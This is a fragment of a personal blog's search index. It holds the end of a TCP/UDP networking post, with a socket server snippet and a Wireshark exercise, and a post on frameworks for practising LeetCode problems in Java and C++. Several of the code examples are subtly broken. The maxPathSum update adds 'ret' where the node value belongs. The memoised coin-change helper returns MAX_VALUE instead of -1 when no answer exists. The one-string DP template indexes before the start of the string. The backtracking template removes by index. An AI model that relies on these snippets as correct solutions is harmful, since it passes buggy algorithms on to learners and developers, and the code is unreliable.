clientsocket, in this case, run the thread from client_thread</span>  ct <span class="token operator">=</span> client_thread<span class="token punctuation">(</span>client<span class="token punctuation">)</span>  ct<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Practical-Wiresharp-packet-capture"><a href="#Practical-Wiresharp-packet-capture" class="headerlink" title="Practical: Wiresharp packet capture"></a>Practical: Wiresharp packet capture</h2><p>Wireshark is widely used to analyse packets. It has powerful filters, and it is a useful tool for network forensics!</p><p>Check that <code>seq</code> and <code>ack</code> numbers follow the rules. Observe how a <code>[RST]</code> flow is like, and how <code>[PSH]</code> packets are followed by an acknowledge packet.</p><p><img src="/2020/05/12/tcp-and-udp/pcap_tcp_analysis.png" alt="TCP packets in Wireshark"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to practice data structures &amp; algorithms, my way to leetcoding</title>
      <link href="/2020/05/03/leetcode-frameworks/"/>
      <url>/2020/05/03/leetcode-frameworks/</url>
      
        <content type="html"><![CDATA[<p>Heya! This is the first of a series of articles about programming problems, which corresponds to my flag <strong>[365 leetcoding]</strong>. First, I am going to share my plan to practice <strong>data structures &amp; algorithms</strong>. This is the main skill tested in interviews, and of course the <strong>base</strong> of everything: the essence of thinking as a computer scientist.</p><p>Before diving into solving the programming problem, I think it is more efficient to have a picture of the main strategies we can use, so that when we see the problem, we can identify the best suited algorithmic paradigm by recognizing <strong>common patterns</strong>. Each paradigm has a corresponding <strong>framework</strong>, which guides me into how to structure my code.</p><p>Below I have collected the main frameworks I use:</p><ul><li>Recursion</li><li>Two pointers</li><li>Backtracking</li><li>Branch and bound</li><li>Brute-force search</li><li>Divide and conquer</li><li>Dynamic programming</li><li>Greedy algorithm</li><li>Prune and search</li></ul><p>TO DO:</p><ul><li>Java code for frameworks</li></ul><h2 id="Frameworks"><a href="#Frameworks" class="headerlink" title="Frameworks"></a>Frameworks</h2><h3 id="Trees-and-recursion"><a href="#Trees-and-recursion" class="headerlink" title="Trees and recursion"></a>Trees and recursion</h3><p>How do you identify a recursion problem?</p><ul><li>The problem needs to use the solution of similar subproblems.</li><li>A traversal.</li></ul><p>We observe that problems about trees often use recursion, because we can treat each of the children of a node as a new tree subproblem, thus the code looks like:</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token keyword">void</span> <span class="token function">traverse</span><span class="token punctuation">(</span>TreeNode node<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>base <span class="token keyword">case</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// base case manipulation</span>     <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">// possible update commands</span>   <span class="token function">traverse</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// possible update commands after solving for left child</span>   <span class="token function">traverse</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// possible update commands after solving for right</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>As an example, take a look at this Leetcode Hard tree problem:</p><h5 id="Leetcode-124-Binary-Tree-Maximum-Path-Sum"><a href="#Leetcode-124-Binary-Tree-Maximum-Path-Sum" class="headerlink" title="Leetcode 124. Binary Tree Maximum Path Sum"></a>Leetcode 124. <a href="https://leetcode.com/problems/binary-tree-maximum-path-sum/" target="_blank" rel="noopener">Binary Tree Maximum Path Sum</a></h5><blockquote><p>Given a non-empty binary tree, find the maximum path sum.<br><br>For this problem, a path is defined as any sequence of nodes from some<br>starting node to any node in the tree along the parent-child connections.<br>The path must contain at least one node and does not need to go through the root.</p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span> ret <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxPathSum</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">oneSideMax</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">oneSideMax</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// base case</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// traverse left</span>  <span class="token keyword">int</span> left <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">oneSideMax</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// traverse right</span>  <span class="token keyword">int</span> right <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">oneSideMax</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// update the answer</span>  ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span> left <span class="token operator">+</span> right <span class="token operator">+</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// return the max path considering the tree with root = root</span>  <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">+</span> root<span class="token punctuation">.</span>val<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The framework is all about traversing all the nodes, and solving the problem for each node by updating a global variable <code>ret</code>. Note that we are using a <strong>global variable</strong> and an auxiliary function <code>oneSideMax()</code>. This is also a common pattern.</p><h3 id="Dynamic-programming"><a href="#Dynamic-programming" class="headerlink" title="Dynamic programming"></a>Dynamic programming</h3><p>Usually, DP problems ask for min or max conditions. To reach those conditions, we have to solve these problems:</p><ol><li><strong><em>Overlapping subproblem</em></strong>: think of a recursive trace that calls a function with same parameters several times, then this might suggest you to store computation results in a <strong>DP table</strong>.</li><li><strong><em>Optimal substructure</em></strong>: from the min or max state of some selected substructures, compute the <strong>optimal state</strong> for this structure. The subproblems should be independent.</li><li><strong><em>State transition equation</em></strong>: how do we measure <strong>state</strong>? This is often the key question in hard problems. The state of the problem functionally determines the result.</li></ol><p>Let’s analyse the coin change problem: How many ways are there to give change given a total amount and a set of coin values?</p><ul><li>Optimal substructure: say we decide to use a coin valued x, then the optimal structure is 1 + dp(amount-x). Since the amount of coins is unlimited, the subproblems are independent, so this is valid.</li><li>What is the state? Since the only change from the problem to the subproblem is the amount of money, the state is the amount of money (so it is passed as parameter).</li><li>Choose and choose the best, using <code>min()</code> or <code>max()</code> functions.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> coin <span class="token operator">:</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">+</span><span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token operator">-</span>coin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>Base case: stop traversing when the <code>n</code>, total amount of money, is 0 or negative.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>Now that we have the state transition equation, let’s optimize it using DP tables.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> memo<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">coinChange</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// dp table</span>memo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> coins<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// helper</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// base case</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// use dp table</span><span class="token keyword">int</span> res <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> coin <span class="token operator">:</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> subproblem <span class="token operator">=</span> <span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token operator">-</span>coin<span class="token punctuation">,</span> coins<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>subproblem <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  res <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">+</span>subproblem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// put it in DP table before returning</span>memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span><span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> res<span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>In many cases, a bottom to top approach does not require recursion and saves space. We can compute from base case to coinChange(n) because coinChange only uses results from coinChange at a lower level. So, it only uses results that we know have already been computed.  </p><h4 id="DP-String-problems-framework"><a href="#DP-String-problems-framework" class="headerlink" title="DP + String problems framework"></a>DP + String problems framework</h4><p><a href="https://leetcode.com/discuss/general-discussion/651719/How-to-solve-DP-String-Template-and-4-Steps-to-be-followed." target="_blank" rel="noopener">This Leetcode Discuss post</a> is very informative.</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">// 1. If you have two strings.</span><span class="token comment" spellcheck="true">/* Pre-processing. Define basic cases. */</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Your code</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Your code</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Leetcode problems</strong>:</p><ul><li><a href="https://leetcode.com/problems/edit-distance/" target="_blank" rel="noopener">Edit distance</a></li><li><a href="https://leetcode.com/problems/delete-operation-for-two-strings/" target="_blank" rel="noopener">Delete Operations for Two Strings</a></li><li><a href="https://leetcode.com/problems/minimum-ascii-delete-sum-for-two-strings/" target="_blank" rel="noopener">Minimum ASCII Delete Sum for Two Strings</a></li></ul><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">// 2. If you are given only one string</span><span class="token comment" spellcheck="true">/* Pre-processing. Define basic cases. */</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s1<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Your code</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Your code</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Leetcode problems</strong>:</p><ul><li><a href="https://leetcode.com/problems/longest-palindromic-subsequence/" target="_blank" rel="noopener">Longest Palindromic Subsequence</a></li><li><a href="https://leetcode.com/problems/palindromic-substrings/" target="_blank" rel="noopener">Palindromic Substrings</a></li></ul><h3 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h3><p>Backtracking is essentially <strong>traversing a decision tree</strong>. The key is to use recursion to make a movement and then delete it. The result is stored as a global variable and is updated meanwhile. This is the framework:</p><pre class="line-numbers language-java"><code class="language-java">List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backtrack</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> path<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> choices<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>ending condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ret<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// try every choice</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> choice <span class="token operator">:</span> choices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// make choice</span>    path<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// try</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> choices<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// delete choice</span>    path<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Binary-search"><a href="#Binary-search" class="headerlink" title="Binary search"></a>Binary search</h3><h2 id="My-plan"><a href="#My-plan" class="headerlink" title="My plan"></a>My plan</h2><p><strong>Goal</strong>: Flag [365 leetcoding]</p><p><strong>Plan</strong>: Solve leetcode problems in this order:</p><pre><code>Recursion -&gt; Linked list -&gt; Stack -&gt; Queue -&gt; Two pointers -&gt; Sliding-window -&gt; hashing -&gt; sorting -&gt; binary search -&gt; trees -&gt; BST -&gt; Heaps -&gt; Graph basics -&gt; BFS -&gt; DFS -&gt; backtracking -&gt; greedy -&gt; Dynamic programming -&gt; advanced graph -&gt; Union find -&gt; bit manipulation</code></pre><p><strong>Action</strong>: Update the framework summary of this post as I learn.  </p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithms </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
